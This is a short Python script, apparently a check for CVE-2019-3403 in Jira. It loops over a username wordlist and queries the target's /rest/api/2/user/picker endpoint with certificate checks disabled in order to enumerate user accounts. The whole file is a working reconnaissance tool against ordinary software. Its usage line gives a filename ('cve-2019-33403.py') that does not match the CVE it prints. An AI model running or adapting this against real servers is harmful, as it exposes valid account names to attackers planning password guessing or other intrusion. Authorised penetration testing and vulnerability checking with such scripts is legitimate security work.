#!/usr/bin/env python3

import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import ConnectionError
import requests

payload = "/rest/api/2/user/picker?query="

if len(sys.argv) != 3:
    print(f"Usage: cve-2019-33403.py URL WORDLIST")
    exit(0)

url = sys.argv[1]
wordlist = sys.argv[2]

print("CHECK: CVE-2019-3403")

with open(wordlist, "r") as f:
    for user in f:
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            status_code = requests.get(url + payload + user, verify=False)
            print(status_code)
        except ConnectionError:
            print("Error connecting to the server")
            break 
